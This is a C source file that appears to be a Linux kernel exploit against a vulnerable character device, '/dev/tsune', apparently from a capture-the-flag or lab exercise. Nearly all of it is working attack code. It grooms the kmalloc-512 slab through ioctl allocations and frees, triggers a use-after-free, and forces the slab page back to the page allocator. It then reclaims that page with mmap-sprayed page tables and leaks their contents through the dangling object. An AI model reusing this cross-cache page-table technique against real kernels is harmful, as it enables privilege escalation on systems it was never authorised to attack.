#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "e.h"

#define DEVICE_NAME "/dev/tsune"
#define IOCTL_CMD_ALLOC 0x810
#define IOCTL_CMD_FREE 0x811
#define IOCTL_CMD_READ 0x812
#define IOCTL_CMD_WRITE 0x813
#define IOCTL_CMD_PAGE 0x814
#define MSG_SZ 512

#define N_PTE 0x8

struct user_req {
    int idx;
    char *userland_buf;
};

#define OBJECT_SIZE 512
#define OBJS_PER_SLAB 8 
#define CPU_PARTIAL 52

void ioctl_alloc(int fd, int i) {
    struct user_req req = {
        .idx = i,
        .userland_buf = NULL
    };

    SYSCHK(ioctl(fd,IOCTL_CMD_ALLOC,&req));
}

void ioctl_free(int fd, int i) {
    struct user_req req = {
        .idx = i,
        .userland_buf = NULL
    };

    SYSCHK(ioctl(fd,IOCTL_CMD_FREE,&req));
}

int main(void) {
    info("kmemcache-512");

    size_t size = 2*1024*1024;
    hl(size)

    void *pte_setup = SYSCHK(mmap(PTI_TO_VIRT(0x1, 0x0, 0x0, 0x0, 0x0), size,
                         PROT_READ | PROT_WRITE, MAP_PRIVATE | 0x20 | MAP_FIXED, -1, 0));
    hl(pte_setup)
    *(char *)pte_setup = 0x1;

    int fd = SYSCHK(open(DEVICE_NAME, O_RDWR));
    hl(fd);

    info("1. allocate (cpu_partial+1)*objs_per_slab")
    int global;
    rep(_,(CPU_PARTIAL+1)*OBJS_PER_SLAB) {
        ioctl_alloc(fd,global);
        global++;
    }

    info("2. allocate objs_per_slab-1")
    rep(_,OBJS_PER_SLAB-1) {
        ioctl_alloc(fd,global);
        global++;
    }

    info("3. allocate uaf object")
    int uaf_idx = global;
    ioctl_alloc(fd,global);
    global++;

    info("4. allocate objs_per_slab+1")
    rep(_,OBJS_PER_SLAB+1) {
        ioctl_alloc(fd,global);
        global++;
    }

    info("5. free uaf object")
    ioctl_free(fd,uaf_idx);

    info("6. make page which has a uaf object empty")
    range(i,1,OBJS_PER_SLAB) {
        ioctl_free(fd,uaf_idx+i);
        ioctl_free(fd,uaf_idx-i);
    }

    info("7. free one object per page")
    rep(i,CPU_PARTIAL) {
        ioctl_free(fd,OBJS_PER_SLAB*i);
    }
    
    char buf[MSG_SZ];
    struct user_req read = {
        .idx = uaf_idx,
        .userland_buf = buf,
    };


    void *pte_new = SYSCHK(mmap(PTI_TO_VIRT(0x1, 0x0, 0x80, 0x0, 0x0), size,
                         PROT_READ | PROT_WRITE, MAP_PRIVATE | 0x20 | MAP_FIXED, -1, 0));
    hl(pte_new)
    for (size_t i = 0; i < size; i += 4096) {
        *((char*)pte_new + i) = 1;
    }

    SYSCHK(ioctl(fd,IOCTL_CMD_READ,&read));
    xxd_qword(buf,sizeof(buf));
}

/*
    -serial tcp:127.0.0.1:9999,server,nowait \
    -gdb tcp::12345 \
*/
